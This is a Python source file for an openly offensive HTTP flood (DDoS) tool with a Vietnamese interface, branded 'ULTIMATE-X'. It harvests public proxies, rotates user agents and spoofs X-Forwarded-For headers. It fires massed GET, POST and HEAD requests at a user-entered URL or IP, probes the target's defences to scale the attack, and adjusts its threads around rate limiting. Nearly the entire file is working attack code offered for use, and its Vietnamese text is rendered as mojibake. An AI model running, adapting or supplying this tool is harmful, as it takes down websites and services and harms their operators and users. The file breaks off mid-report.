#!/usr/bin/env python3

# -*- coding: utf-8 -*-
# ¬©Ô∏è Quang B·∫£o 2025 - All Rights Reserved

import requests
import threading
import multiprocessing
import time
import urllib.parse
import os
import random
import hashlib
import json
from datetime import datetime
from colorama import init, Fore, Back, Style
import socket
import ssl
import http.client
import aiohttp
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import Counter

# Initialize colorama
init()

# Fallback ANSI codes
try:
    from colorama import init, Fore, Back, Style
    init()
except ImportError:
    class Fore:
        CYAN = '\033[96m'
        BLUE = '\033[94m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        RED = '\033[91m'
        MAGENTA = '\033[95m'
        WHITE = '\033[97m'
        RESET = '\033[0m'

    class Back:
        BLACK = '\033[40m'
        BLUE = '\033[44m'
        CYAN = '\033[46m'
        RESET = '\033[0m'

    class Style:
        BRIGHT = '\033[1m'
        RESET_ALL = '\033[0m'

# Configuration
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
]

PROXY_LIST = []
PROXY_API_URLS = [
    "http://pubproxy.com/api/proxy?limit=20&format=json&type=http",
    "https://api.getproxylist.com/proxy?protocol[]=http&lastTested=86400",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://proxylist.geonode.com/api/proxy-list?limit=50&page=1&sort_by=lastChecked&sort_type=desc&protocols=http",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/all.txt",
]
PROXY_REFRESH_INTERVAL = 300  # Refresh proxies every 5 minutes

POST_DATA = {
    "key": random.randint(1, 9999999),
    "value": random.random(),
    "secret": "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16)),
    "token": hashlib.md5(str(time.time()).encode()).hexdigest(),
    "attack_vector": random.choice(["destroy", "obliterate", "annihilate"])
}

TARGET_CONFIGS = [
    {"id": "1", "name": "100k", "category": "Light", "threads": 100, "requests": 1000, "desc": "100K Requests", "level": "Th·∫•p", "application": "Ki·ªÉm tra c∆° b·∫£n"},
    {"id": "2", "name": "500k", "category": "Light", "threads": 200, "requests": 2500, "desc": "500K Requests", "level": "Th·∫•p", "application": "Ki·ªÉm tra nh·∫π"},
    {"id": "3", "name": "10m", "category": "Medium", "threads": 500, "requests": 20000, "desc": "10M Requests", "level": "Trung b√¨nh", "application": "T·∫•n c√¥ng v·ª´a"},
    {"id": "4", "name": "40m", "category": "Medium", "threads": 1000, "requests": 40000, "desc": "40M Requests", "level": "Trung b√¨nh", "application": "T·∫•n c√¥ng trung b√¨nh"},
    {"id": "5", "name": "70m", "category": "Heavy", "threads": 2000, "requests": 35000, "desc": "70M Requests", "level": "Cao", "application": "T·∫•n c√¥ng m·∫°nh"},
    {"id": "6", "name": "100m", "category": "Heavy", "threads": 3000, "requests": 33334, "desc": "100M Requests", "level": "Cao", "application": "T·∫•n c√¥ng l·ªõn"},
    {"id": "7", "name": "200m", "category": "Extreme", "threads": 5000, "requests": 40000, "desc": "200M Requests", "level": "R·∫•t Cao", "application": "T·∫•n c√¥ng quy m√¥"},
    {"id": "8", "name": "500m", "category": "Extreme", "threads": 10000, "requests": 50000, "desc": "500M Requests", "level": "C·ª±c Cao", "application": "T·∫•n c√¥ng si√™u l·ªõn"},
    {"id": "9", "name": "700m", "category": "Extreme", "threads": 15000, "requests": 46667, "desc": "700M Requests", "level": "C·ª±c Cao", "application": "T·∫•n c√¥ng t·ªëi ƒëa"},
]

# Global counters
manager = threading.Lock()
success_count = 0
error_count = 0
response_times = []
status_codes = []
EXPECTED_HASH = None
last_proxy_refresh = 0
current_threads = 0

# Proxy Management Functions
def fetch_proxies():
    global PROXY_LIST, last_proxy_refresh
    PROXY_LIST.clear()
    for api_url in PROXY_API_URLS:
        try:
            response = requests.get(api_url, timeout=5)
            response.raise_for_status()
            if api_url in PROXY_API_URLS[:4]:
                data = response.json() if api_url != PROXY_API_URLS[2] else response.text.splitlines()
                if api_url == PROXY_API_URLS[0]:  # pubproxy.com
                    if data.get('count', 0) > 0:
                        for proxy in data['data']:
                            if proxy['type'] == 'http' and proxy['support']['get']:
                                proxy_url = f"http://{proxy['ip']}:{proxy['port']}"
                                PROXY_LIST.append({'http': proxy_url, 'https': proxy_url})
                elif api_url == PROXY_API_URLS[1]:  # getproxylist.com
                    proxy_url = f"http://{data['ip']}:{data['port']}"
                    PROXY_LIST.append({'http': proxy_url, 'https': proxy_url})
                elif api_url == PROXY_API_URLS[2]:  # proxy-list.download
                    for line in data:
                        if line:
                            ip, port = line.split(':')
                            proxy_url = f"http://{ip}:{port}"
                            PROXY_LIST.append({'http': proxy_url, 'https': proxy_url})
                elif api_url == PROXY_API_URLS[3]:  # geonode.com
                    if data.get('total', 0) > 0:
                        for proxy in data['data']:
                            proxy_url = f"http://{proxy['ip']}:{proxy['port']}"
                            PROXY_LIST.append({'http': proxy_url, 'https': proxy_url})
            else:  # GitHub raw proxy lists
                for line in response.text.splitlines():
                    if line.strip():
                        ip, port = line.split(':')[:2]
                        proxy_url = f"http://{ip}:{port}"
                        PROXY_LIST.append({'http': proxy_url, 'https': proxy_url})
            print(f"{Fore.GREEN}‚úÖ [PROXY] ƒê√£ l·∫•y {len(PROXY_LIST)} proxy t·ª´ {api_url}{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}üö® [PROXY] L·ªói khi l·∫•y proxy t·ª´ {api_url}: {str(e)}{Fore.RESET}")
    if PROXY_LIST:
        last_proxy_refresh = time.time()
        print(f"{Fore.GREEN}‚úÖ [PROXY] T·ªïng c·ªông {len(PROXY_LIST)} proxy ƒë√£ ƒë∆∞·ª£c l·∫•y{Fore.RESET}")
        return True
    else:
        print(f"{Fore.RED}üö® [PROXY] Kh√¥ng l·∫•y ƒë∆∞·ª£c proxy t·ª´ b·∫•t k·ª≥ API n√†o{Fore.RESET}")
        return False

def validate_proxy(proxy):
    try:
        test_url = "http://example.com"
        response = requests.get(test_url, proxies=proxy, timeout=3)
        return response.status_code == 200
    except Exception:
        return False

def refresh_proxies_if_needed():
    global last_proxy_refresh, PROXY_LIST
    if time.time() - last_proxy_refresh > PROXY_REFRESH_INTERVAL or not PROXY_LIST:
        print(f"{Fore.YELLOW}üîÑ [PROXY] ƒêang l√†m m·ªõi danh s√°ch proxy...{Fore.RESET}")
        loading_animation("L·∫•y proxy t·ª´ API", 1)
        if fetch_proxies():
            valid_proxies = []
            with ThreadPoolExecutor(max_workers=20) as executor:
                future_to_proxy = {executor.submit(validate_proxy, proxy): proxy for proxy in PROXY_LIST}
                for future in as_completed(future_to_proxy):
                    proxy = future_to_proxy[future]
                    if future.result():
                        valid_proxies.append(proxy)
            PROXY_LIST.clear()
            PROXY_LIST.extend(valid_proxies)
            print(f"{Fore.GREEN}‚úÖ [PROXY] ƒê√£ gi·ªØ l·∫°i {len(PROXY_LIST)} proxy ho·∫°t ƒë·ªông{Fore.RESET}")
            if not PROXY_LIST:
                print(f"{Fore.RED}üö® [PROXY] Kh√¥ng c√≥ proxy n√†o ho·∫°t ƒë·ªông, s·ª≠ d·ª•ng k·∫øt n·ªëi tr·ª±c ti·∫øp{Fore.RESET}")

def get_random_proxy():
    refresh_proxies_if_needed()
    return random.choice(PROXY_LIST) if PROXY_LIST else None

# Utility Functions
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def loading_animation(text="Chu·∫©n b·ªã tri·ªÉn khai", duration=2):
    print(f"{Fore.RED}{Style.BRIGHT}üöÄ [H·ªÜ TH·ªêNG] {text}...{Style.RESET_ALL}{Fore.RESET}")
    for _ in range(3):
        print(f"{Fore.YELLOW}‚ñà{Fore.RESET}", end="", flush=True)
        time.sleep(duration / 3)
    print(f"\n{Fore.GREEN}{Style.BRIGHT}‚úÖ [H·ªÜ TH·ªêNG] {text} - Ho√†n t·∫•t!{Style.RESET_ALL}{Fore.RESET}")

def typing_effect(text, delay=0.005):
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN]
    for i, char in enumerate(text):
        color = colors[i % len(colors)]
        print(f"{color}{Style.BRIGHT}‚ö°{char}{Style.RESET_ALL}", end='', flush=True)
        time.sleep(delay)
    print(Fore.RESET)

def check_file_integrity():
    global EXPECTED_HASH
    try:
        with open(__file__, 'rb') as f:
            file_content = f.read()
            file_hash = hashlib.sha256(file_content).hexdigest()
            if EXPECTED_HASH is None:
                EXPECTED_HASH = file_hash
                print(f"{Fore.YELLOW}üîí [H·ªÜ TH·ªêNG] T·∫°o m√£ bƒÉm m·ªõi: {file_hash}{Fore.RESET}")
            elif file_hash != EXPECTED_HASH:
                print(f"{Fore.RED}üö® [L·ªñI NGHI√äM TR·ªåNG] T·ªáp b·ªã thay ƒë·ªïi! Tho√°t.{Fore.RESET}")
                exit(1)
    except Exception as e:
        print(f"{Fore.RED}üö® [L·ªñI NGHI√äM TR·ªåNG] Ki·ªÉm tra t√≠nh to√†n v·∫πn th·∫•t b·∫°i: {str(e)}{Fore.RESET}")
        exit(1)

def generate_random_headers():
    return {
        'User-Agent': random.choice(USER_AGENTS),
        'Accept': random.choice(['text/html', 'application/json', '*/*']),
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9', 'fr-FR,fr;q=0.8']),
        'Accept-Encoding': random.choice(['gzip, deflate', 'br', 'identity']),
        'Connection': 'keep-alive',
        'Cache-Control': random.choice(['no-cache', 'max-age=0']),
        'Referer': random.choice(['https://google.com', 'https://bing.com', 'https://yahoo.com']),
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'DNT': random.choice(['1', '0']),
    }

def validate_url(url):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    try:
        result = urllib.parse.urlparse(url)
        if not result.scheme or not result.netloc:
            raise ValueError("URL kh√¥ng h·ª£p l·ªá")
        return url
    except Exception as e:
        raise ValueError(f"URL kh√¥ng h·ª£p l·ªá: {e}")

def save_attack_config(url, num_threads, requests_per_thread, target_type):
    config = {
        "url": url,
        "num_threads": num_threads,
        "requests_per_thread": requests_per_thread,
        "target_type": target_type,
        "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    try:
        with open("persistent_attack.json", "w") as f:
            json.dump(config, f)
        print(f"{Fore.YELLOW}üíæ [H·ªÜ TH·ªêNG] C·∫•u h√¨nh t·∫•n c√¥ng li√™n t·ª•c ƒë√£ l∆∞u: {url}{Fore.RESET}")
    except Exception as e:
        print(f"{Fore.RED}üö® [L·ªñI] Kh√¥ng th·ªÉ l∆∞u c·∫•u h√¨nh t·∫•n c√¥ng: {str(e)}{Fore.RESET}")

def generate_key_hash(key):
    secret = "QUANGBAO2025ULTIMATE"
    return hashlib.sha512((secret + key).encode()).hexdigest()

def validate_key():
    VALID_KEY = "baoddos"
    VALID_KEY_HASH = generate_key_hash(VALID_KEY)
    attempts = 0
    max_attempts = 3
    while attempts < max_attempts:
        clear_screen()
        display_banner()
        print(f"{Fore.YELLOW}üîë Nh·∫≠p m√£ truy c·∫≠p: {Fore.WHITE}", end="")
        user_key = input().strip()
        loading_animation("X√°c minh th√¥ng tin", 1)
        if generate_key_hash(user_key) == VALID_KEY_HASH:
            print(f"{Fore.GREEN}{Style.BRIGHT}‚úÖ [H·ªÜ TH·ªêNG] Truy c·∫≠p ƒë∆∞·ª£c c·∫•p! H·ªá th·ªëng k√≠ch ho·∫°t.{Style.RESET_ALL}{Fore.RESET}")
            time.sleep(1)
            return True
        else:
            attempts += 1
            remaining = max_attempts - attempts
            print(f"{Fore.RED}{Style.BRIGHT}üö® [H·ªÜ TH·ªêNG] M√£ kh√¥ng h·ª£p l·ªá! C√≤n {remaining} l·∫ßn th·ª≠.{Style.RESET_ALL}{Fore.RESET}")
            if remaining == 0:
                print(f"{Fore.RED}{Style.BRIGHT}üîí [H·ªÜ TH·ªêNG] Truy c·∫≠p b·ªã kh√≥a!{Style.RESET_ALL}{Fore.RESET}")
                return False
            time.sleep(1)

def assess_target_security(url):
    session = requests.Session()
    try:
        response_times = []
        status_codes = []
        for _ in range(10):
            start_time = time.perf_counter()
            try:
                response = session.get(url, headers=generate_random_headers(), proxies=get_random_proxy(), timeout=3)
                end_time = time.perf_counter()
                response_times.append((end_time - start_time) * 1000)
                status_codes.append(response.status_code)
            except requests.exceptions.RequestException:
                break
            time.sleep(0.05)
        if not response_times:
            print(f"{Fore.RED}üö® [L·ªñI] Kh√¥ng th·ªÉ k·∫øt n·ªëi m·ª•c ti√™u{Fore.RESET}")
            return "CAO", 200, 1000
        avg_response_time = sum(response_times) / len(response_times)
        error_rate = sum(1 for code in status_codes if code in (429, 503, 522)) / len(status_codes)
        security_score = 0
        if avg_response_time < 500:
            security_score += 30
        if error_rate < 0.1:
            security_score += 20
        if security_score < 50:
            security_level = "TH·∫§P"
            recommended_threads = 100
            recommended_requests = 1000
            print(f"{Fore.GREEN}üõ°Ô∏è [K·∫æT QU·∫¢] M·ª•c ti√™u: B·∫£o m·∫≠t th·∫•p - D·ªÖ t·∫•n c√¥ng{Fore.RESET}")
        elif security_score < 80:
            security_level = "TRUNG B√åNH"
            recommended_threads = 200
            recommended_requests = 2500
            print(f"{Fore.YELLOW}üõ°Ô∏è [K·∫æT QU·∫¢] M·ª•c ti√™u: B·∫£o m·∫≠t trung b√¨nh - C·∫ßn l·ª±c l∆∞·ª£ng v·ª´a ph·∫£i{Fore.RESET}")
        else:
            security_level = "CAO"
            recommended_threads = 500
            recommended_requests = 5000
            print(f"{Fore.RED}üõ°Ô∏è [K·∫æT QU·∫¢] M·ª•c ti√™u: B·∫£o m·∫≠t cao - C·∫ßn l·ª±c l∆∞·ª£ng t·ªëi ƒëa{Fore.RESET}")
        return security_level, recommended_threads, recommended_requests
    except Exception as e:
        print(f"{Fore.RED}üö® [L·ªñI] L·ªói nghi√™m tr·ªçng: {str(e)}{Fore.RESET}")
        return "CAO", 200, 1000

def adjust_threads(base_threads, status_codes, response_times):
    global current_threads
    if not status_codes or not response_times:
        return base_threads
    status_counter = Counter(status_codes[-100:])  # Analyze last 100 requests
    total = sum(status_counter.values())
    error_rate = sum(status_counter[code] for code in (429, 503, 522)) / total if total > 0 else 0
    avg_response_time = sum(response_times[-100:]) / len(response_times[-100:]) if response_times else 1000
    success_rate = status_counter[200] / total if total > 0 and 200 in status_counter else 0
    
    if error_rate > 0.3:
        new_threads = max(50, base_threads // 2)
        print(f"{Fore.YELLOW}‚ö† [H·ªÜ TH·ªêNG] Ph√°t hi·ªán l·ªói {error_rate*100:.1f}% (429/503/522), gi·∫£m lu·ªìng xu·ªëng {new_threads}{Fore.RESET}")
    elif success_rate > 0.8 and avg_response_time < 500:
        new_threads = min(base_threads * 2, multiprocessing.cpu_count() * 100)
        print(f"{Fore.GREEN}üöÄ [H·ªÜ TH·ªêNG] T·ª∑ l·ªá th√†nh c√¥ng {success_rate*100:.1f}%, th·ªùi gian ph·∫£n h·ªìi {avg_response_time:.1f}ms, tƒÉng lu·ªìng l√™n {new_threads}{Fore.RESET}")
    else:
        new_threads = base_threads
    current_threads = new_threads
    return new_threads

# Attack Function
def send_request(url, request_count, stop_event):
    global success_count, error_count, response_times, status_codes
    session = requests.Session()
    methods = ["GET", "POST", "HEAD"]
    for _ in range(request_count):
        if stop_event.is_set():
            break
        try:
            method = random.choice(methods)
            headers = generate_random_headers()
            proxy = get_random_proxy()
            delay = random.uniform(0, 0.0001)
            time.sleep(delay)
            start_time = time.perf_counter()
            if method == "GET":
                response = session.get(url, headers=headers, proxies=proxy, timeout=3, allow_redirects=True)
            elif method == "HEAD":
                response = session.head(url, headers=headers, proxies=proxy, timeout=3, allow_redirects=True)
            else:
                response = session.post(url, data=POST_DATA, headers=headers, proxies=proxy, timeout=3, allow_redirects=True)
            end_time = time.perf_counter()
            response_time = (end_time - start_time) * 1000
            with manager:
                success_count += 1
                response_times.append(response_time)
                status_codes.append(response.status_code)
            if response.status_code in (503, 429, 522):
                print(f"{Fore.YELLOW}‚ö° [T·∫§N C√îNG] {method} T·∫•n c√¥ng: M√£ tr·∫°ng th√°i {response.status_code} | Th·ªùi gian: {response_time:.2f}ms | M·ª•c ti√™u: ƒêANG QU√Å T·∫¢I{Fore.RESET}")
            else:
                print(f"{Fore.YELLOW}‚ö° [T·∫§N C√îNG] {method} T·∫•n c√¥ng: M√£ tr·∫°ng th√°i {response.status_code} | Th·ªùi gian: {response_time:.2f}ms | M·ª•c ti√™u: ƒêANG CH·ªäU √ÅP L·ª∞C{Fore.RESET}")
        except requests.exceptions.RequestException as e:
            with manager:
                error_count += 1
                status_codes.append(0)
            print(f"{Fore.RED}üö® [T·∫§N C√îNG TH·∫§T B·∫†I] L·ªói: {str(e)}{Fore.RESET}")
            if "proxy" in str(e).lower():
                refresh_proxies_if_needed()
        except Exception as e:
            with manager:
                error_count += 1
                status_codes.append(0)
            print(f"{Fore.RED}üö® [T·∫§N C√îNG TH·∫§T B·∫†I] L·ªói: {str(e)}{Fore.RESET}")
            if "proxy" in str(e).lower():
                refresh_proxies_if_needed()

# UI Functions
def display_banner():
    banner = [
        f"{Fore.RED}{Style.BRIGHT}‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó{Style.RESET_ALL}",
        f"{Fore.RED}‚ïë üíÄ ULTIMATE-X v4.3 - QUANG B·∫¢O ¬© 2025              ‚ïë{Style.RESET_ALL}",
        f"{Fore.RED}‚ïë üöÄ GIAO TH·ª®C: QUANG BAO PROTOCOL v3.3              ‚ïë{Style.RESET_ALL}",
        f"{Fore.RED}‚ïë üõ°Ô∏è M·ªåI QUY·ªÄN ƒê∆Ø·ª¢C B·∫¢O L∆ØU                           ‚ïë{Style.RESET_ALL}",
        f"{Fore.RED}‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù{Style.RESET_ALL}",
        f"{Fore.CYAN} H√†nh ƒë·ªông trong im l·∫∑ng, chi·∫øn th·∫Øng trong b√≥ng t·ªëi{Style.RESET_ALL}"
    ]
    clear_screen()
    for line in banner:
        typing_effect(line, delay=0.005)
    time.sleep(0.5)

def display_target_menu():
    clear_screen()
    display_banner()
    print(f"{Fore.CYAN}{Style.BRIGHT}‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ CHI·∫æN L∆Ø·ª¢C T·∫§N C√îNG ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}‚îÇ 0. üìã Xem chi ti·∫øt chi·∫øn l∆∞·ª£c         ‚îÇ{Fore.RESET}")
    print(f"{Fore.CYAN}‚îú{'‚îÄ' * 37}‚î§{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}‚îÇ {'ID':<4} ‚îÇ {'T√™n':<12} ‚îÇ {'M√¥ t·∫£':<15} ‚îÇ {'C·∫•p ƒë·ªô':<10} ‚îÇ{Fore.RESET}")
    print(f"{Fore.CYAN}‚îú{'‚îÄ' * 37}‚î§{Style.RESET_ALL}")
    for target in TARGET_CONFIGS:
        print(f"{Fore.YELLOW}‚îÇ {target['id']:<4} ‚îÇ {target['name'][:12]:<12} ‚îÇ {target['desc'][:15]:<15} ‚îÇ {target['level'][:10]:<10} ‚îÇ{Fore.RESET}")
    print(f"{Fore.CYAN}‚îî{'‚îÄ' * 37}‚îò{Style.RESET_ALL}")
    print(f"{Fore.CYAN}¬© Quang B·∫£o 2025{Fore.RESET}")

def display_ordered_functions():
    clear_screen()
    display_banner()
    print(f"{Fore.CYAN}{Style.BRIGHT}‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ CHI TI·∫æT CHI·∫æN L∆Ø·ª¢C T·∫§N C√îNG ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê{Style.RESET_ALL}")
    categories = ["Light", "Medium", "Heavy", "Extreme"]
    for category in categories:
        print(f"{Fore.MAGENTA}{Style.BRIGHT}üìÇ Danh m·ª•c: {category.upper()}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}‚îú{'‚îÄ' * 43}‚î§{Fore.RESET}")
        for idx, func in enumerate([f for f in TARGET_CONFIGS if f['category'] == category], 1):
            print(f"{Fore.YELLOW}{idx}. {func['name'].upper()}")
            print(f"   üìù M√¥ t·∫£: {func['desc']}")
            print(f"   üßµ Lu·ªìng: {func['threads']:,}")
            print(f"   üì® Y√™u c·∫ßu/Lu·ªìng: {func['requests']:,}")
            print(f"   üí• T·ªïng l∆∞·ª£t ƒë√°nh: {func['threads'] * func['requests']:,}")
            print(f"   üåü C·∫•p ƒë·ªô: {func['level']}")
            print(f"   üéØ ·ª®ng d·ª•ng: {func['application']}{Fore.RESET}\n")
    input(f"{Fore.CYAN}‚èé Nh·∫•n Enter ƒë·ªÉ tr·ªü v·ªÅ menu ch√≠nh...{Fore.RESET}")

def target_selection_effect(target_type):
    frames = [
        f"{Fore.RED}{Style.BRIGHT}üîç [KH√ìA M·ª§C TI√äU] {target_type.upper()} [20%]...{Style.RESET_ALL}",
        f"{Fore.YELLOW}{Style.BRIGHT}üîç [KH√ìA M·ª§C TI√äU] {target_type.upper()} [50%]...{Style.RESET_ALL}",
        f"{Fore.CYAN}{Style.BRIGHT}üîç [KH√ìA M·ª§C TI√äU] {target_type.upper()} [80%]...{Style.RESET_ALL}",
        f"{Fore.GREEN}{Style.BRIGHT}üéØ [M·ª§C TI√äU ƒê√É KH√ìA] {target_type.upper()} [100%]!{Style.RESET_ALL}"
    ]
    for frame in frames:
        clear_screen()
        display_banner()
        print(frame)
        time.sleep(0.3)

# Main Function
def main():
    check_file_integrity()
    multiprocessing.set_start_method('spawn')
    refresh_proxies_if_needed()  # Initial proxy fetch
    while True:
        try:
            if not validate_key():
                print(f"{Fore.RED}{Style.BRIGHT}üö® [H·ªÜ TH·ªêNG] H·ªßy t·∫•n c√¥ng - X√°c th·ª±c th·∫•t b·∫°i{Style.RESET_ALL}{Fore.RESET}")
                exit(1)

            display_target_menu()
            choice = input(f"{Fore.CYAN}üî¢ Nh·∫≠p l·ª±a ch·ªçn (0, 1-9): {Fore.RESET}").strip()

            if choice == "0":
                display_ordered_functions()
                continue

            target = next((t for t in TARGET_CONFIGS if t['id'] == choice), None)
            if not target:
                print(f"{Fore.RED}üö® [L·ªñI] L·ª±a ch·ªçn kh√¥ng h·ª£p l·ªá! Th·ª≠ l·∫°i.{Fore.RESET}")
                time.sleep(1)
                continue
            target_selection_effect(target['name'])

            base_threads = target['threads']
            base_requests = target['requests']

            input_url = input(f"{Fore.CYAN}üåê Nh·∫≠p URL ho·∫∑c IP m·ª•c ti√™u: {Fore.WHITE}").strip()
            if not input_url:
                print(f"{Fore.RED}üö® [L·ªñI] URL/IP kh√¥ng ƒë∆∞·ª£c ƒë·ªÉ tr·ªëng! Th·ª≠ l·∫°i.{Fore.RESET}")
                time.sleep(1)
                continue

            try:
                validated_url = validate_url(input_url)
                host = urllib.parse.urlparse(validated_url).hostname
                port = urllib.parse.urlparse(validated_url).port or 80
            except ValueError:
                host = input_url
                port = 80
                validated_url = f"http://{host}"
                print(f"{Fore.YELLOW}‚Ñπ [H·ªÜ TH·ªêNG] X·ª≠ l√Ω m·ª•c ti√™u nh∆∞ IP: {host}{Fore.RESET}")

            print(f"{Fore.YELLOW}{Style.BRIGHT}üéØ [H·ªÜ TH·ªêNG] M·ª•c ti√™u ƒë√£ kh√≥a: {validated_url}{Style.RESET_ALL}")

            security_level, recommended_threads, recommended_requests = assess_target_security(validated_url)

            if security_level == "TH·∫§P":
                NUM_THREADS = min(recommended_threads, base_threads // 2)
                REQUESTS_PER_THREAD = min(recommended_requests, base_requests // 2)
                attack_strategy = "T·∫§N C√îNG NH·∫∏"
            elif security_level == "TRUNG B√åNH":
                NUM_THREADS = base_threads
                REQUESTS_PER_THREAD = base_requests
                attack_strategy = "L·ª∞C L∆Ø·ª¢NG V·ª™A PH·∫¢I"
            else:
                NUM_THREADS = max(recommended_threads, base_threads)
                REQUESTS_PER_THREAD = max(recommended_requests, base_requests)
                attack_strategy = "L·ª∞C L∆Ø·ª¢NG T·ªêI ƒêA"

            print(f"""
{Fore.CYAN}{Style.BRIGHT}
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ CHI·∫æN L∆Ø·ª¢C T·∫§N C√îNG ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ üîß Ki·ªÉu: {target['name'].upper():<20} ‚îÇ
‚îÇ üéØ M·ª•c ti√™u: {validated_url:<17} ‚îÇ
‚îÇ üßµ Lu·ªìng: {NUM_THREADS:<18} ‚îÇ
‚îÇ üì® Y√™u c·∫ßu/Lu·ªìng: {REQUESTS_PER_THREAD:<10} ‚îÇ
‚îÇ ‚öô Chi·∫øn l∆∞·ª£c: {attack_strategy:<12} ‚îÇ
‚îÇ üí• T·ªïng l∆∞·ª£t ƒë√°nh: {NUM_THREADS * REQUESTS_PER_THREAD:<10} ‚îÇ
‚îÇ üîå Proxy ho·∫°t ƒë·ªông: {len(PROXY_LIST):<10} ‚îÇ
‚îî{'‚îÄ' * 34}‚îò
{Style.RESET_ALL}
            """)
            loading_animation("Kh·ªüi ƒë·ªông t·∫•n c√¥ng", 2)

            start_time = time.time()
            stop_event = threading.Event()
            global success_count, error_count, response_times, status_codes
            success_count = 0
            error_count = 0
            response_times = []
            status_codes = []

            def thread_wrapper(url, requests_per_thread):
                send_request(url, requests_per_thread, stop_event)

            with ThreadPoolExecutor(max_workers=min(NUM_THREADS, multiprocessing.cpu_count() * 10)) as executor:
                futures = []
                for _ in range(NUM_THREADS):
                    futures.append(executor.submit(thread_wrapper, validated_url, REQUESTS_PER_THREAD))
                
                # Monitor and adjust threads every 10 seconds
                while not all(f.done() for f in futures):
                    time.sleep(10)
                    new_threads = adjust_threads(NUM_THREADS, status_codes, response_times)
                    if new_threads != current_threads:
                        executor._max_workers = new_threads
                        print(f"{Fore.CYAN}üîß [H·ªÜ TH·ªêNG] ƒê√£ ƒëi·ªÅu ch·ªânh lu·ªìng th√†nh {new_threads}{Fore.RESET}")
                    if stop_event.is_set():
                        break

                try:
                    for future in as_completed(futures):
                        future.result()
                except KeyboardInterrupt:
                    stop_event.set()
                    print(f"{Fore.YELLOW}‚ùå [H·ªÜ TH·ªêNG] T·∫•n c√¥ng b·ªã d·ª´ng b·ªüi ng∆∞·ªùi d√πng{Fore.RESET}")
                    executor._threads.clear()
                    exit(0)

            end_time = time.time()
            total_time = end_time - start_time
            with manager:
                if response_times:
                    avg_response_time = sum(response_times) / len(response_times)
                    max_response_time = max(response_times)
                    min_response_time = min(response_times)
                else:
                    avg_response_time = 0
                    max_response_time = 0
                    min_response_time = 0
            print(f"""
{Fore.CYAN}{Style.BRIGHT}
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ[ B√ÅO C√ÅO CHI·∫æN D·ªäCH: {target['name'].upper()} ]‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ üí• T·ªïng l∆∞·ª£t ƒë√°nh: {(NUM_THREADS * REQUESTS_PER_THREAD):,}       ‚îÇ
‚îÇ ‚úÖ Th√†nh c√¥ng: {success_count:,} ({success_count/(NUM_THREADS * REQUESTS_PER_THREAD)*100:.1f}%) ‚îÇ
‚îÇ ‚ùå Th·∫•t b·∫°i: {error_count:,} ({error_count/(NUM_THREADS * REQUESTS_PER_THREAD)*100:.1f}%) ‚îÇ
‚îÇ ‚è± T·ªïng th·ªùi gian: {total_time:.2f} gi√¢y                        ‚îÇ
